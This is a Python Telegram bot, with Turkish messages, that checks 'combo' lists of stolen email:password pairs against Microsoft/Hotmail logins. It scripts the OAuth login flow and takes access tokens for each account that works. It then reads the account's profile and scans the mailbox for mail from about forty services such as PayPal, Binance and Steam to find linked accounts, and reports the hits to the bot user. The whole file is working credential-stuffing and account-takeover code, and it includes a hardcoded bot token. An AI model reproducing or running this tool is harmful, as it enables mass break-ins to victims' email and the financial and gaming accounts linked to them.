import telebot
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

BOT_TOKEN = "8149331862:AAF2i7LRP717LzXF5pPiut3TbZRL_HvcYBk"
CHANNEL_USERNAME = "@sonshack"
bot = telebot.TeleBot(BOT_TOKEN)

services = {
    "Facebook": ["security@facebookmail.com"],
    "Instagram": ["security@mail.instagram.com"],
    "TikTok": ["register@account.tiktok.com", "noreply@tiktok.com"],
    "Twitter": ["info@x.com"],
    "Supercell": ["noreply@id.supercell.com"],
    "EA Sports": ["EA@e.ea.com"],
    "PUBG": ["noreply@pubgmobile.com"],
    "Microsoft": ["account-security-noreply@accountprotection.microsoft.com"],
    "Steam": ["noreply@steampowered.com"],
    "Roblox": ["accounts@roblox.com"],
    "Spotify": ["no-reply@spotify.com"],
    "Rockstar": ["noreply@rockstargames.com"],
    "EpicGames": ["help@acct.epicgames.com"],
    "PlayStation": ["reply@txn-email.playstation.com"],
    "Xbox": ["xboxreps@engage.xbox.com"],
    "Netflix": ["info@account.netflix.com", "no-reply@mailer.netflix.com"],
    "PayPal": ["service@paypal.com.br"],
    "Binance": ["do-not-reply@ses.binance.com"],
    "Bitkub": ["no-reply@bitkub.com"],
    "Apple": ["appleid@id.apple.com"],
    "LinkedIn": ["security-noreply@linkedin.com"],
    "Amazon": ["account-update@amazon.com", "no-reply@amazon.com"],
    "Telegram": ["login@telegram.org"],
    "Yahoo": ["account-security@cc.yahoo-inc.com"],
    "AliExpress": ["notification@notice.aliexpress.com"],
    "OnlyFans": ["support@onlyfans.com"],
    "Payoneer": ["do_not_reply@payoneer.com"],
    "Google": ["no-reply@accounts.google.com"],
    "Nintendo": ["nintendo-noreply@ccg.nintendo.com"],
    "Deezer": ["no-reply@deezer.com"],
    "GOG": ["no-reply@gog.com"],
    "Ubisoft": ["account@ubi.com", "noreply@ubi.com"],
    "Yandex": ["security@yandex.com"],
    "Mega": ["support@mega.nz"],
    "Reddit": ["noreply@reddit.com"],
    "ProtonMail": ["security@protonmail.com"],
    "Tumblr": ["no-reply@tumblr.com"],
    "Bigo": ["no-reply@bigo.tv"],
    "Zalo": ["no-reply@zalo.me"],
    "VK": ["security@vk.com"],
    "Discord": ["noreply@discord.com"],
    "Pinterest": ["noreply@account.pinterest.com"],
    "Dropbox": ["no-reply@dropbox.com"],
}

a, b = 0, 0
combo_list = []
lock = threading.Lock()

def check_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=["start"])
def start_cmd(message):
    if not check_membership(message.from_user.id):
        return bot.send_message(message.chat.id, f"📛 {CHANNEL_USERNAME} kanalına katılmadan kullanamazsın.\nKatıldıktan sonra tekrar /start yaz.")
    bot.send_message(message.chat.id, "👋 Hoş geldin!\nLütfen .txt combo dosyasını gönder.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not check_membership(message.from_user.id):
        return bot.send_message(message.chat.id, f"📛 Önce {CHANNEL_USERNAME} kanalına katıl.")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        lines = downloaded.decode("utf-8").splitlines()

        global combo_list, a, b
        a, b = 0, 0
        combo_list = [line.strip() for line in lines if ":" in line]
        bot.send_message(message.chat.id, f"📥 {len(combo_list)} combo yüklendi.\n✅ Tarama başlatıldı...")

        threading.Thread(target=start_checking, args=(message.chat.id,)).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Hata: {e}")

def start_checking(chat_id):
    executor = ThreadPoolExecutor(max_workers=10)
    for line in combo_list:
        try:
            email, password = line.split(":", 1)
            executor.submit(get_values, email, password, chat_id)
        except Exception as e:
            print(f"[!] Combo ayrıştırma hatası: {e} - {line}")

def get_values(Email, Password, chat_id):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
        "X-Requested-With": "com.microsoft.outlooklite"
    }
    try:
        url = (
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1"
            f"&login_hint={Email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        res = requests.get(url, headers=headers)
        text = res.text
        cookies = res.cookies.get_dict()
        URL = text.split("urlPost:'")[1].split("'")[0]
        PPFT = text.split('name="PPFT" id="i0327" value="')[1].split('"')[0]
        AD = res.url.split('haschrome=1')[0]

        login_protocol(Email, Password, URL, PPFT, AD, cookies, chat_id)
    except Exception as e:
        print(f"[!] get_values hata: {e} - {Email}")

def login_protocol(Email, Password, URL, PPFT, AD, cookies, chat_id):
    try:
        payload = (
            f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&passwd={Password}&ps=2"
            f"&PPFT={PPFT}&PPSX=PassportR&NewUser=1&fspost=0&i21=0&isSignupPost=0&i19=9960"
        )
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
            "Referer": f"{AD}haschrome=1",
            "Cookie": "; ".join([f"{k}={v}" for k, v in cookies.items()])
        }
        res = requests.post(URL, data=payload, headers=headers, allow_redirects=False)
        cook = res.cookies.get_dict()
        if any(k in cook for k in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
            get_token(Email, Password, cook, res.headers, chat_id)
        else:
            update_bad(chat_id, Email, Password)
    except Exception as e:
        print(f"[!] login_protocol hata: {e} - {Email}")

def get_token(Email, Password, cook, headerss, chat_id):
    try:
        location = headerss.get("Location", "")
        if "code=" not in location:
            return update_bad(chat_id, Email, Password)
        code = location.split("code=")[1].split("&")[0]
        CID = cook.get("MSPCID", "").upper()
        data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        response = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data)
        token = response.json().get("access_token")
        if token:
            get_infoo(Email, Password, token, CID, chat_id)
        else:
            update_bad(chat_id, Email, Password)
    except Exception as e:
        print(f"[!] get_token hata: {e} - {Email}")

def get_infoo(Email, Password, token, CID, chat_id):
    try:
        he = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{CID}",
        }
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
        name = r.get("names", [{}])[0].get("displayName", "Bilinmiyor")
        loca = r.get("accounts", [{}])[0].get("location", "Bilinmiyor")

        url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "authorization": f"Bearer {token}",
            "x-owa-sessionid": CID,
            "x-owa-correlationid": CID,
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
        }
        rese = requests.post(url, headers=headers, data="").text

        def status(domains): return '🟢' if any(d in rese for d in domains) else '🔴'

        msg = f"""✅ HOTMAIL GOD ✅

📧 Email: {Email}
🔐 Şifre: {Password}
👤 İsim: {name}
🌍 Ülke: {loca}

Servis Bağlantıları:"""
        for serv, mails in services.items():
            msg += f"\n{serv}: {status(mails)}"

        msg += f"\n\n👑 @sikicikurucu | GOD: {a+1} | BAD: {b}"
        bot.send_message(chat_id, msg)

        with open("/storage/emulated/0/Download/Telegram/githotaltyapı.txt", "a", encoding="utf-8") as f:
            f.write(msg + "\n" + "-"*40 + "\n")

        update_god()
    except Exception as e:
        print(f"[!] get_infoo hata: {e} - {Email}")

def update_god():
    global a
    with lock:
        a += 1

def update_bad(chat_id, Email, Password):
    global b
    with lock:
        b += 1
    print(f"❌ {b} - BAD: {Email}:{Password}")

print("🤖 BOT BAŞLADI...")
bot.polling()